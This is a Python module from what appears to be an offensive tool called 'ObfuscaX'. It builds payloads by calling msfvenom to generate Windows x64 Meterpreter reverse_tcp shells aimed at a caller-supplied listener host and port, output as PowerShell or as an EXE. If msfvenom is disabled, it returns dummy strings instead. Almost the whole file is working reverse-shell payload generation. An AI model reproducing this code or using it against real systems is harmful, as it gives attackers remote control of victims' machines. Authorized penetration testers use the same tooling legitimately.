import logging
import os
import subprocess
import tempfile

logger = logging.getLogger("ObfuscaX")


def generate_payload(payload_type, lhost, lport, use_msf=False):
    """
    Generate payload using msfvenom or return a dummy payload.
    payload_type: "ps1" or "exe"
    """
    if not use_msf:
        logger.warning("msfvenom usage not enabled, returning dummy payload.")
        if payload_type == "ps1":
            return b"Write-Host 'Dummy PowerShell Payload'"
        elif payload_type == "exe":
            return b"Dummy EXE Payload"
        else:
            raise ValueError("Unsupported payload type")

    cmd = [
        "msfvenom",
        "-p", "windows/x64/meterpreter/reverse_tcp",
        f"LHOST={lhost}",
        f"LPORT={lport}",
    ]

    try:
        if payload_type == "ps1":
            logger.info("Generating PowerShell payload using msfvenom...")
            result = subprocess.run(
                cmd + ["-f", "powershell"], capture_output=True, check=True, timeout=120
            )
            return result.stdout

        if payload_type == "exe":
            logger.info("Generating EXE payload using msfvenom...")
            # Temp file avoids a fixed payload.exe in the working directory.
            with tempfile.TemporaryDirectory() as tmp:
                out = os.path.join(tmp, "payload.exe")
                subprocess.run(
                    cmd + ["-f", "exe", "-o", out],
                    capture_output=True, check=True, timeout=120,
                )
                with open(out, "rb") as f:
                    return f.read()

        raise ValueError("Unsupported payload type")

    except subprocess.CalledProcessError as e:
        logger.error(f"msfvenom failed: {e.stderr.decode(errors='replace')}")
        raise
    except subprocess.TimeoutExpired:
        logger.error("msfvenom timed out after 120 seconds.")
        raise
